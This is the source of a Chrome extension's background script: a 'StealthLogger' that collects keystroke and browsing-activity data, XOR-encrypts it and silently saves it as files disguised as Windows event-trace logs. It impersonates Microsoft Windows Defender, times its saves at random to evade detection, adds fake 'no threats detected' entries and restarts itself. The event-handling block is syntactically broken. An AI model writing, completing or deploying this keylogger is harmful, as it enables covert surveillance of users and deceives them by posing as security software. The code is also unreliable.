// Hardcoded configuration
const CONFIG = {
    SALT: "Test@1234!!!",
    LOG_DIR: "C:\\WindowsSystemHealthLogs\\",
    COMPANY: "Microsoft",
    PRODUCT: "Windows Defender",
    VERSION: "1.0.2"
};

// Simple XOR encryption
function encryptData(data, salt) {
    let encrypted = '';
    for (let i = 0; i < data.length; i++) {
        const charCode = data.charCodeAt(i) ^ salt.charCodeAt(i % salt.length);
        encrypted += String.fromCharCode(charCode);
    }
    return btoa(encrypted); // Base64 encode
}

// Generate legitimate-looking filename
function generateFilename() {
    const timestamp = new Date().toISOString().replace(/[-:]/g, '').split('.')[0];
    const prefixes = [
        'SystemDiagnostics',
        'PerformanceLog',
        'ResourceMonitor',
        'EventTracing',
        'HealthMetrics'
    ];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return `${prefix}_${timestamp}.etl`; // .etl files are legitimate Windows Event Trace Logs
}

class StealthLogger {
    constructor() {
        this.buffer = "";
        this.logCount = 0;
        this.isActive = true;
        this.lastActivity = Date.now();
        this.init();
    }

    init() {
        // Random intervals to avoid pattern detection
        this.saveInterval = setInterval(() => this.saveBuffer(), 
            Math.floor(Math.random() * 45000) + 30000); // 30-75 seconds random
        
        // Mimic legitimate system activity
        this.systemMimicInterval = setInterval(() => this.mimicSystemActivity(), 60000);
        
        console.log(`${CONFIG.PRODUCT} ${CONFIG.VERSION} initialized`);
    }

    mimicSystemActivity() {
        // Create legitimate-looking system messages
        const messages = [
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: System scan completed`,
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: No threats detected`,
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Memory usage optimized`,
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Network traffic analyzed`
        ];
        const randomMsg = messages[Math.floor(Math.random() * messages.length)];
        this.addToBuffer(randomMsg);
    }

    addToBuffer(data) {
        if (!this.isActive || !data) return;
        
        const timestamp = new Date().toISOString();
        const entry = `[${timestamp}] ${data}\n`;
        this.buffer += entry;
        this.lastActivity = Date.now();
        
        // Auto-save if buffer gets large
        if (this.buffer.length > 10240) { // 10KB
            this.saveBuffer();
        }
    }

    saveBuffer() {
        if (this.buffer.length === 0 || !this.isActive) return;
        
        try {
            // Encrypt the buffer
            const encryptedData = encryptData(this.buffer, CONFIG.SALT);
            
            // Add legitimate headers to make it look like system file
            const header = `<?xml version="1.0" encoding="UTF-8"?>
<!-- ${CONFIG.COMPANY} ${CONFIG.PRODUCT} Diagnostic Log -->
<!-- Generated: ${new Date().toISOString()} -->
<!-- Version: ${CONFIG.VERSION} -->
<EventTraceSession xmlns="http://schemas.microsoft.com/win/2004/08/events/trace">
  <System>
    <Provider Name="${CONFIG.PRODUCT}" Guid="{${this.generateGuid()}}" />
    <EventID>1000</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>0</Task>
    <Opcode>0</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="${new Date().toISOString()}" />
    <Correlation ActivityID="{${this.generateGuid()}}" />
    <Execution ProcessID="${Math.floor(Math.random() * 10000)}" ThreadID="${Math.floor(Math.random() * 1000)}" />
    <Channel>Application</Channel>
    <Computer>${this.getComputerName()}</Computer>
  </System>
  <UserData>
    <Data>`;
            
            const footer = `</Data>
  </UserData>
</EventTraceSession>`;
            
            const finalData = header + encryptedData + footer;
            const filename = generateFilename();
            const fullPath = "WindowsSystemHealthLogs/" + filename;
            
            // Create and download
            const url = "data:application/xml;base64," + btoa(finalData);

			chrome.downloads.download({
			url: url,
			filename: "WindowsSystemHealthLogs/" + filename,
			saveAs: false,
			conflictAction: 'uniquify'
		}, (downloadId) => {
			if (chrome.runtime.lastError) {
			console.error("Download failed:", chrome.runtime.lastError.message);
			} else {
			this.buffer = "";
			this.logCount++;
			}
		});
            
        } catch (error) {
            console.error('Save error:', error);
        }
    }

    generateGuid() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    getComputerName() {
        return navigator.platform || 'WIN11-PC';
    }

    cleanupOldLogs() {
        // Simulate log rotation like legitimate system software
        console.log(`${CONFIG.PRODUCT}: Performing log maintenance`);
    }

    deactivate() {
        this.isActive = false;
        clearInterval(this.saveInterval);
        clearInterval(this.systemMimicInterval);
        if (this.buffer.length > 0) {
            this.saveBuffer();
        }
    }
}

// Initialize stealth logger
const logger = new StealthLogger();

// Listen for keystrokes
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (!request || !logger.isActive) return;
    
    switch(request.type) {
case 'ACTIVITY':
    logger.addToBuffer(request.data);

    if (request.events) {
        try {
            const events = JSON.parse(request.events);

            events.forEach(event => {
                logger.addToBuffer(JSON.stringify({
    type: event.type,
    site: event.window,
    details: event.details,
    time: event.timestamp
}));

        } catch (e) {
            console.error("Failed to parse events:", e);
        }
    }
    break;
        case 'SYSTEM':
            logger.mimicSystemActivity();
            break;
        case 'STATUS':
            sendResponse({ active: logger.isActive, logs: logger.logCount });
            break;
    }
});

// Handle extension lifecycle
chrome.runtime.onSuspend.addListener(() => {
    logger.deactivate();
});

chrome.runtime.onSuspendCanceled.addListener(() => {
    logger.isActive = true;
});

// Self-protection: Restart if something goes wrong
setTimeout(() => {
    if (!logger.isActive) {
        console.log(`${CONFIG.PRODUCT}: Service restarting...`);
        logger.isActive = true;
    }
}, 300000); // Check every 5 minutes
